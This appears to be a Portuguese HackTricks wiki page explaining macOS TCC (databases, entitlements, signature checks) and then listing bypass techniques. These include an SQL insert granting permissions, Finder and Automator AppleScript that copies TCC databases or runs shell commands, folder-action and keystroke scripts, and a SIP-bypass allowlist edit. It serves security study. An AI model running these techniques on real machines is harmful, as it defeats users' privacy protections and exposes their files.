# macOS TCC

{{#include ../../../../banners/hacktricks-training.md}}

## **Informações Básicas**

**TCC (Transparência, Consentimento e Controle)** é um protocolo de segurança que se concentra na regulação das permissões de aplicativos. Seu papel principal é proteger recursos sensíveis como **serviços de localização, contatos, fotos, microfone, câmera, acessibilidade e acesso total ao disco**. Ao exigir consentimento explícito do usuário antes de conceder acesso do aplicativo a esses elementos, o TCC melhora a privacidade e o controle do usuário sobre seus dados.

Os usuários encontram o TCC quando os aplicativos solicitam acesso a recursos protegidos. Isso é visível através de um prompt que permite aos usuários **aprovar ou negar o acesso**. Além disso, o TCC acomoda ações diretas do usuário, como **arrastar e soltar arquivos em um aplicativo**, para conceder acesso a arquivos específicos, garantindo que os aplicativos tenham acesso apenas ao que é explicitamente permitido.

![Um exemplo de um prompt do TCC](https://rainforest.engineering/images/posts/macos-tcc/tcc-prompt.png?1620047855)

**TCC** é gerenciado pelo **daemon** localizado em `/System/Library/PrivateFrameworks/TCC.framework/Support/tccd` e configurado em `/System/Library/LaunchDaemons/com.apple.tccd.system.plist` (registrando o serviço mach `com.apple.tccd.system`).

Há um **tccd em modo de usuário** em execução por usuário logado definido em `/System/Library/LaunchAgents/com.apple.tccd.plist` registrando os serviços mach `com.apple.tccd` e `com.apple.usernotifications.delegate.com.apple.tccd`.

Aqui você pode ver o tccd rodando como sistema e como usuário:
```bash
ps -ef | grep tcc
0   374     1   0 Thu07PM ??         2:01.66 /System/Library/PrivateFrameworks/TCC.framework/Support/tccd system
501 63079     1   0  6:59PM ??         0:01.95 /System/Library/PrivateFrameworks/TCC.framework/Support/tccd
```
As permissões são **herdadas do aplicativo pai** e as **permissões** são **monitoradas** com base no **Bundle ID** e no **Developer ID**.

### Bancos de Dados TCC

As permissões concedidas/negadas são então armazenadas em alguns bancos de dados TCC:

- O banco de dados do sistema em **`/Library/Application Support/com.apple.TCC/TCC.db`**.
- Este banco de dados é **protegido por SIP**, então apenas um bypass de SIP pode escrever nele.
- O banco de dados TCC do usuário **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`** para preferências por usuário.
- Este banco de dados é protegido, então apenas processos com altos privilégios TCC, como Acesso Completo ao Disco, podem escrever nele (mas não é protegido por SIP).

> [!WARNING]
> Os bancos de dados anteriores também são **protegidos por TCC para acesso de leitura**. Portanto, você **não poderá ler** seu banco de dados TCC de usuário regular, a menos que seja de um processo privilegiado por TCC.
>
> No entanto, lembre-se de que um processo com esses altos privilégios (como **FDA** ou **`kTCCServiceEndpointSecurityClient`**) poderá escrever no banco de dados TCC dos usuários.

- Há um **terceiro** banco de dados TCC em **`/var/db/locationd/clients.plist`** para indicar clientes autorizados a **acessar serviços de localização**.
- O arquivo protegido por SIP **`/Users/carlospolop/Downloads/REG.db`** (também protegido contra acesso de leitura com TCC) contém a **localização** de todos os **bancos de dados TCC válidos**.
- O arquivo protegido por SIP **`/Users/carlospolop/Downloads/MDMOverrides.plist`** (também protegido contra acesso de leitura com TCC) contém mais permissões concedidas pelo TCC.
- O arquivo protegido por SIP **`/Library/Apple/Library/Bundles/TCC_Compatibility.bundle/Contents/Resources/AllowApplicationsList.plist`** (mas legível por qualquer um) é uma lista de permissões de aplicativos que requerem uma exceção TCC.

> [!TIP]
> O banco de dados TCC em **iOS** está em **`/private/var/mobile/Library/TCC/TCC.db`**.

> [!NOTE]
> A **interface do centro de notificações** pode fazer **alterações no banco de dados TCC do sistema**:
>
> ```bash
> codesign -dv --entitlements :- /System/Library/PrivateFrameworks/TCC.framework/> Support/tccd
> [..]
> com.apple.private.tcc.manager
> com.apple.rootless.storage.TCC
> ```
>
> No entanto, os usuários podem **deletar ou consultar regras** com a ferramenta de linha de comando **`tccutil`**.

#### Consultar os bancos de dados

{{#tabs}}
{{#tab name="user DB"}}
```bash
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db
sqlite> .schema
# Tables: admin, policies, active_policy, access, access_overrides, expired, active_policy_id
# The table access contains the permissions per services
sqlite> select service, client, auth_value, auth_reason from access;
kTCCServiceLiverpool|com.apple.syncdefaultsd|2|4
kTCCServiceSystemPolicyDownloadsFolder|com.tinyspeck.slackmacgap|2|2
kTCCServiceMicrophone|us.zoom.xos|2|2
[...]

# Check user approved permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=2;
# Check user denied permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=0;
```
{{#endtab}}

{{#tab name="system DB"}}
```bash
sqlite3 /Library/Application\ Support/com.apple.TCC/TCC.db
sqlite> .schema
# Tables: admin, policies, active_policy, access, access_overrides, expired, active_policy_id
# The table access contains the permissions per services
sqlite> select service, client, auth_value, auth_reason from access;
kTCCServiceLiverpool|com.apple.syncdefaultsd|2|4
kTCCServiceSystemPolicyDownloadsFolder|com.tinyspeck.slackmacgap|2|2
kTCCServiceMicrophone|us.zoom.xos|2|2
[...]

# Get all FDA
sqlite> select service, client, auth_value, auth_reason from access where service = "kTCCServiceSystemPolicyAllFiles" and auth_value=2;

# Check user approved permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=2;
# Check user denied permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=0;
```
{{#endtab}}
{{#endtabs}}

> [!TIP]
> Verificando ambos os bancos de dados, você pode verificar as permissões que um aplicativo permitiu, proibiu ou não possui (ele solicitará).

- O **`service`** é a representação em string da **permissão** do TCC
- O **`client`** é o **ID do pacote** ou **caminho para o binário** com as permissões
- O **`client_type`** indica se é um Identificador de Pacote (0) ou um caminho absoluto (1)

<details>

<summary>Como executar se for um caminho absoluto</summary>

Basta fazer **`launctl load you_bin.plist`**, com um plist como:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<!-- Label for the job -->
<key>Label</key>
<string>com.example.yourbinary</string>

<!-- The path to the executable -->
<key>Program</key>
<string>/path/to/binary</string>

<!-- Arguments to pass to the executable (if any) -->
<key>ProgramArguments</key>
<array>
<string>arg1</string>
<string>arg2</string>
</array>

<!-- Run at load -->
<key>RunAtLoad</key>
<true/>

<!-- Keep the job alive, restart if necessary -->
<key>KeepAlive</key>
<true/>

<!-- Standard output and error paths (optional) -->
<key>StandardOutPath</key>
<string>/tmp/YourBinary.stdout</string>
<key>StandardErrorPath</key>
<string>/tmp/YourBinary.stderr</string>
</dict>
</plist>
```
</details>

- O **`auth_value`** pode ter diferentes valores: denied(0), unknown(1), allowed(2) ou limited(3).
- O **`auth_reason`** pode assumir os seguintes valores: Error(1), User Consent(2), User Set(3), System Set(4), Service Policy(5), MDM Policy(6), Override Policy(7), Missing usage string(8), Prompt Timeout(9), Preflight Unknown(10), Entitled(11), App Type Policy(12)
- O campo **csreq** está lá para indicar como verificar o binário a ser executado e conceder as permissões do TCC:
```bash
# Query to get cserq in printable hex
select service, client, hex(csreq) from access where auth_value=2;

# To decode it (https://stackoverflow.com/questions/52706542/how-to-get-csreq-of-macos-application-on-command-line):
BLOB="FADE0C000000003000000001000000060000000200000012636F6D2E6170706C652E5465726D696E616C000000000003"
echo "$BLOB" | xxd -r -p > terminal-csreq.bin
csreq -r- -t < terminal-csreq.bin

# To create a new one (https://stackoverflow.com/questions/52706542/how-to-get-csreq-of-macos-application-on-command-line):
REQ_STR=$(codesign -d -r- /Applications/Utilities/Terminal.app/ 2>&1 | awk -F ' => ' '/designated/{print $2}')
echo "$REQ_STR" | csreq -r- -b /tmp/csreq.bin
REQ_HEX=$(xxd -p /tmp/csreq.bin  | tr -d '\n')
echo "X'$REQ_HEX'"
```
- Para mais informações sobre os **outros campos** da tabela [**ver este post no blog**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive).

Você também pode verificar as **permissões já concedidas** a aplicativos em `System Preferences --> Security & Privacy --> Privacy --> Files and Folders`.

> [!TIP]
> Os usuários _podem_ **deletar ou consultar regras** usando **`tccutil`**.

#### Redefinir permissões do TCC
```bash
# You can reset all the permissions given to an application with
tccutil reset All app.some.id

# Reset the permissions granted to all apps
tccutil reset All
```
### Verificações de Assinatura do TCC

O **banco de dados** do TCC armazena o **Bundle ID** da aplicação, mas também **armazena** **informações** sobre a **assinatura** para **garantir** que o App que solicita o uso de uma permissão é o correto.
```bash
# From sqlite
sqlite> select service, client, hex(csreq) from access where auth_value=2;
#Get csreq

# From bash
echo FADE0C00000000CC000000010000000600000007000000060000000F0000000E000000000000000A2A864886F763640601090000000000000000000600000006000000060000000F0000000E000000010000000A2A864886F763640602060000000000000000000E000000000000000A2A864886F7636406010D0000000000000000000B000000000000000A7375626A6563742E4F550000000000010000000A364E33385657533542580000000000020000001572752E6B656570636F6465722E54656C656772616D000000 | xxd -r -p - > /tmp/telegram_csreq.bin
## Get signature checks
csreq -t -r /tmp/telegram_csreq.bin
(anchor apple generic and certificate leaf[field.1.2.840.113635.100.6.1.9] /* exists */ or anchor apple generic and certificate 1[field.1.2.840.113635.100.6.2.6] /* exists */ and certificate leaf[field.1.2.840.113635.100.6.1.13] /* exists */ and certificate leaf[subject.OU] = "6N38VWS5BX") and identifier "ru.keepcoder.Telegram"
```
> [!WARNING]
> Portanto, outros aplicativos que usam o mesmo nome e ID de pacote não poderão acessar as permissões concedidas a outros aplicativos.

### Direitos e Permissões TCC

Os aplicativos **não apenas precisam** **solicitar** e ter **acesso concedido** a alguns recursos, eles também precisam **ter os direitos relevantes**.\
Por exemplo, **Telegram** tem o direito `com.apple.security.device.camera` para solicitar **acesso à câmera**. Um **aplicativo** que **não** tiver esse **direito não poderá** acessar a câmera (e o usuário não será nem mesmo solicitado a dar as permissões).

No entanto, para que os aplicativos **acessam** **certas pastas do usuário**, como `~/Desktop`, `~/Downloads` e `~/Documents`, eles **não precisam** ter nenhum **direito específico.** O sistema lidará com o acesso de forma transparente e **pedirá ao usuário** conforme necessário.

Os aplicativos da Apple **não gerarão prompts**. Eles contêm **direitos pré-concedidos** em sua lista de **direitos**, o que significa que **nunca gerarão um popup**, **nem** aparecerão em nenhum dos **bancos de dados TCC.** Por exemplo:
```bash
codesign -dv --entitlements :- /System/Applications/Calendar.app
[...]
<key>com.apple.private.tcc.allow</key>
<array>
<string>kTCCServiceReminders</string>
<string>kTCCServiceCalendar</string>
<string>kTCCServiceAddressBook</string>
</array>
```
Isso evitará que o Calendar peça ao usuário para acessar lembretes, calendário e a lista de contatos.

> [!TIP]
> Além de alguma documentação oficial sobre permissões, também é possível encontrar **informações interessantes não oficiais sobre permissões em** [**https://newosxbook.com/ent.jl**](https://newosxbook.com/ent.jl)

Algumas permissões do TCC são: kTCCServiceAppleEvents, kTCCServiceCalendar, kTCCServicePhotos... Não há uma lista pública que defina todas elas, mas você pode verificar esta [**lista das conhecidas**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive#service).

### Locais sensíveis não protegidos

- $HOME (em si)
- $HOME/.ssh, $HOME/.aws, etc
- /tmp

### Intenção do Usuário / com.apple.macl

Como mencionado anteriormente, é possível **conceder acesso a um App a um arquivo arrastando e soltando-o nele**. Esse acesso não será especificado em nenhum banco de dados do TCC, mas como um **atributo estendido do arquivo**. Este atributo irá **armazenar o UUID** do aplicativo permitido:
```bash
xattr Desktop/private.txt
com.apple.macl

# Check extra access to the file
## Script from https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command
macl_read Desktop/private.txt
Filename,Header,App UUID
"Desktop/private.txt",0300,769FD8F1-90E0-3206-808C-A8947BEBD6C3

# Get the UUID of the app
otool -l /System/Applications/Utilities/Terminal.app/Contents/MacOS/Terminal| grep uuid
uuid 769FD8F1-90E0-3206-808C-A8947BEBD6C3
```
> [!NOTE]
> É curioso que o atributo **`com.apple.macl`** é gerenciado pelo **Sandbox**, não pelo tccd.
>
> Também note que se você mover um arquivo que permite o UUID de um aplicativo no seu computador para um computador diferente, porque o mesmo aplicativo terá UIDs diferentes, não concederá acesso a esse aplicativo.

O atributo estendido `com.apple.macl` **não pode ser limpo** como outros atributos estendidos porque é **protegido pelo SIP**. No entanto, como [**explicado neste post**](https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/), é possível desativá-lo **compactando** o arquivo, **deletando**-o e **descompactando**-o.

## TCC Privesc & Bypasses

### Inserir no TCC

Se em algum momento você conseguir acesso de gravação a um banco de dados TCC, pode usar algo como o seguinte para adicionar uma entrada (remova os comentários):

<details>

<summary>Exemplo de Inserir no TCC</summary>
```sql
INSERT INTO access (
service,
client,
client_type,
auth_value,
auth_reason,
auth_version,
csreq,
policy_id,
indirect_object_identifier_type,
indirect_object_identifier,
indirect_object_code_identity,
flags,
last_modified,
pid,
pid_version,
boot_uuid,
last_reminded
) VALUES (
'kTCCServiceSystemPolicyDesktopFolder', -- service
'com.googlecode.iterm2', -- client
0, -- client_type (0 - bundle id)
2, -- auth_value  (2 - allowed)
3, -- auth_reason (3 - "User Set")
1, -- auth_version (always 1)
X'FADE0C00000000C40000000100000006000000060000000F0000000200000015636F6D2E676F6F676C65636F64652E697465726D32000000000000070000000E000000000000000A2A864886F7636406010900000000000000000006000000060000000E000000010000000A2A864886F763640602060000000000000000000E000000000000000A2A864886F7636406010D0000000000000000000B000000000000000A7375626A6563742E4F550000000000010000000A483756375859565137440000', -- csreq is a BLOB, set to NULL for now
NULL, -- policy_id
NULL, -- indirect_object_identifier_type
'UNUSED', -- indirect_object_identifier - default value
NULL, -- indirect_object_code_identity
0, -- flags
strftime('%s', 'now'), -- last_modified with default current timestamp
NULL, -- assuming pid is an integer and optional
NULL, -- assuming pid_version is an integer and optional
'UNUSED', -- default value for boot_uuid
strftime('%s', 'now') -- last_reminded with default current timestamp
);
```
</details>

### TCC Payloads

Se você conseguiu acessar um aplicativo com algumas permissões TCC, verifique a seguinte página com payloads TCC para abusar delas:

{{#ref}}
macos-tcc-payloads.md
{{#endref}}

### Apple Events

Saiba mais sobre Apple Events em:

{{#ref}}
macos-apple-events.md
{{#endref}}

### Automação (Finder) para FDA\*

O nome TCC da permissão de Automação é: **`kTCCServiceAppleEvents`**\
Esta permissão TCC específica também indica a **aplicação que pode ser gerenciada** dentro do banco de dados TCC (portanto, as permissões não permitem apenas gerenciar tudo).

**Finder** é um aplicativo que **sempre tem FDA** (mesmo que não apareça na interface do usuário), então, se você tiver privilégios de **Automação** sobre ele, pode abusar de seus privilégios para **fazer com que ele execute algumas ações**.\
Neste caso, seu aplicativo precisaria da permissão **`kTCCServiceAppleEvents`** sobre **`com.apple.Finder`**.

{{#tabs}}
{{#tab name="Steal users TCC.db"}}
```applescript
# This AppleScript will copy the system TCC database into /tmp
osascript<<EOD
tell application "Finder"
set homeFolder to path to home folder as string
set sourceFile to (homeFolder & "Library:Application Support:com.apple.TCC:TCC.db") as alias
set targetFolder to POSIX file "/tmp" as alias
duplicate file sourceFile to targetFolder with replacing
end tell
EOD
```
{{#endtab}}

{{#tab name="Roubar sistemas TCC.db"}}
```applescript
osascript<<EOD
tell application "Finder"
set sourceFile to POSIX file "/Library/Application Support/com.apple.TCC/TCC.db" as alias
set targetFolder to POSIX file "/tmp" as alias
duplicate file sourceFile to targetFolder with replacing
end tell
EOD
```
{{#endtab}}
{{#endtabs}}

Você poderia abusar disso para **escrever seu próprio banco de dados TCC de usuário**.

> [!WARNING]
> Com esta permissão, você poderá **pedir ao Finder para acessar pastas restritas do TCC** e lhe dar os arquivos, mas até onde sei, você **não poderá fazer o Finder executar código arbitrário** para abusar totalmente do acesso FDA dele.
>
> Portanto, você não poderá abusar de todas as habilidades do FDA.

Este é o prompt do TCC para obter privilégios de Automação sobre o Finder:

<figure><img src="../../../../images/image (27).png" alt="" width="244"><figcaption></figcaption></figure>

> [!CAUTION]
> Note que, como o aplicativo **Automator** tem a permissão TCC **`kTCCServiceAppleEvents`**, ele pode **controlar qualquer aplicativo**, como o Finder. Portanto, tendo a permissão para controlar o Automator, você também poderia controlar o **Finder** com um código como o abaixo:

<details>

<summary>Obter um shell dentro do Automator</summary>
```applescript
osascript<<EOD
set theScript to "touch /tmp/something"

tell application "Automator"
set actionID to Automator action id "com.apple.RunShellScript"
tell (make new workflow)
add actionID to it
tell last Automator action
set value of setting "inputMethod" to 1
set value of setting "COMMAND_STRING" to theScript
end tell
execute it
end tell
activate
end tell
EOD
# Once inside the shell you can use the previous code to make Finder copy the TCC databases for example and not TCC prompt will appear
```
</details>

O mesmo acontece com o **Script Editor app**, ele pode controlar o Finder, mas usando um AppleScript você não pode forçá-lo a executar um script.

### Automação (SE) para algum TCC

**Eventos do Sistema podem criar Ações de Pasta, e Ações de Pasta podem acessar algumas pastas do TCC** (Desktop, Documents & Downloads), então um script como o seguinte pode ser usado para abusar desse comportamento:
```bash
# Create script to execute with the action
cat > "/tmp/script.js" <<EOD
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("cp -r $HOME/Desktop /tmp/desktop");
EOD

osacompile -l JavaScript -o "$HOME/Library/Scripts/Folder Action Scripts/script.scpt" "/tmp/script.js"

# Create folder action with System Events in "$HOME/Desktop"
osascript <<EOD
tell application "System Events"
-- Ensure Folder Actions are enabled
set folder actions enabled to true

-- Define the path to the folder and the script
set homeFolder to path to home folder as text
set folderPath to homeFolder & "Desktop"
set scriptPath to homeFolder & "Library:Scripts:Folder Action Scripts:script.scpt"

-- Create or get the Folder Action for the Desktop
if not (exists folder action folderPath) then
make new folder action at end of folder actions with properties {name:folderPath, path:folderPath}
end if
set myFolderAction to folder action folderPath

-- Attach the script to the Folder Action
if not (exists script scriptPath of myFolderAction) then
make new script at end of scripts of myFolderAction with properties {name:scriptPath, path:scriptPath}
end if

-- Enable the Folder Action and the script
enable myFolderAction
end tell
EOD

# File operations in the folder should trigger the Folder Action
touch "$HOME/Desktop/file"
rm "$HOME/Desktop/file"
```
### Automação (SE) + Acessibilidade (**`kTCCServicePostEvent`|**`kTCCServiceAccessibility`**)** para FDA\*

A automação em **`System Events`** + Acessibilidade (**`kTCCServicePostEvent`**) permite enviar **teclas para processos**. Dessa forma, você poderia abusar do Finder para alterar o TCC.db dos usuários ou para conceder FDA a um aplicativo arbitrário (embora a senha possa ser solicitada para isso).

Exemplo de sobrescrita do TCC.db dos usuários pelo Finder:
```applescript
-- store the TCC.db file to copy in /tmp
osascript <<EOF
tell application "System Events"
-- Open Finder
tell application "Finder" to activate

-- Open the /tmp directory
keystroke "g" using {command down, shift down}
delay 1
keystroke "/tmp"
delay 1
keystroke return
delay 1

-- Select and copy the file
keystroke "TCC.db"
delay 1
keystroke "c" using {command down}
delay 1

-- Resolve $HOME environment variable
set homePath to system attribute "HOME"

-- Navigate to the Desktop directory under $HOME
keystroke "g" using {command down, shift down}
delay 1
keystroke homePath & "/Library/Application Support/com.apple.TCC"
delay 1
keystroke return
delay 1

-- Check if the file exists in the destination and delete if it does (need to send keystorke code: https://macbiblioblog.blogspot.com/2014/12/key-codes-for-function-and-special-keys.html)
keystroke "TCC.db"
delay 1
keystroke return
delay 1
key code 51 using {command down}
delay 1

-- Paste the file
keystroke "v" using {command down}
end tell
EOF
```
### `kTCCServiceAccessibility` para FDA\*

Verifique esta página para alguns [**payloads para abusar das permissões de Acessibilidade**](macos-tcc-payloads.md#accessibility) para privesc para FDA\* ou executar um keylogger, por exemplo.

### **Cliente de Segurança de Endpoint para FDA**

Se você tem **`kTCCServiceEndpointSecurityClient`**, você tem FDA. Fim.

### Arquivo de Política do Sistema SysAdmin para FDA

**`kTCCServiceSystemPolicySysAdminFiles`** permite **alterar** o atributo **`NFSHomeDirectory`** de um usuário que muda sua pasta inicial e, portanto, permite **burlar o TCC**.

### Banco de Dados TCC do Usuário para FDA

Obtendo **permissões de escrita** sobre o banco de dados **TCC do usuário**, você **não pode** conceder a si mesmo permissões de **`FDA`**, apenas aquele que vive no banco de dados do sistema pode conceder isso.

Mas você pode **dar a si mesmo** **`direitos de Automação ao Finder`**, e abusar da técnica anterior para escalar para FDA\*.

### **Permissões de FDA para TCC**

**Acesso Completo ao Disco** é o nome do TCC **`kTCCServiceSystemPolicyAllFiles`**

Eu não acho que isso seja uma verdadeira privesc, mas só para o caso de você achar útil: Se você controla um programa com FDA, você pode **modificar o banco de dados TCC dos usuários e dar a si mesmo qualquer acesso**. Isso pode ser útil como uma técnica de persistência caso você possa perder suas permissões de FDA.

### **Bypass de SIP para Bypass de TCC**

O **banco de dados TCC** do sistema é protegido por **SIP**, por isso apenas processos com as **autorizações indicadas poderão modificá-lo**. Portanto, se um atacante encontrar um **bypass de SIP** sobre um **arquivo** (ser capaz de modificar um arquivo restrito por SIP), ele poderá:

- **Remover a proteção** de um banco de dados TCC e dar a si mesmo todas as permissões TCC. Ele poderia abusar de qualquer um desses arquivos, por exemplo:
- O banco de dados do sistema TCC
- REG.db
- MDMOverrides.plist

No entanto, há outra opção para abusar desse **bypass de SIP para burlar o TCC**, o arquivo `/Library/Apple/Library/Bundles/TCC_Compatibility.bundle/Contents/Resources/AllowApplicationsList.plist` é uma lista de permissões de aplicativos que requerem uma exceção de TCC. Portanto, se um atacante puder **remover a proteção SIP** deste arquivo e adicionar seu **próprio aplicativo**, o aplicativo poderá burlar o TCC.\
Por exemplo, para adicionar o terminal:
```bash
# Get needed info
codesign -d -r- /System/Applications/Utilities/Terminal.app
```
AllowApplicationsList.plist:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Services</key>
<dict>
<key>SystemPolicyAllFiles</key>
<array>
<dict>
<key>CodeRequirement</key>
<string>identifier &quot;com.apple.Terminal&quot; and anchor apple</string>
<key>IdentifierType</key>
<string>bundleID</string>
<key>Identifier</key>
<string>com.apple.Terminal</string>
</dict>
</array>
</dict>
</dict>
</plist>
```
### Bypasses do TCC

{{#ref}}
macos-tcc-bypasses/
{{#endref}}

## Referências

- [**https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive)
- [**https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command**](https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command)
- [**https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/**](https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/)
- [**https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/**](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)

{{#include ../../../../banners/hacktricks-training.md}}
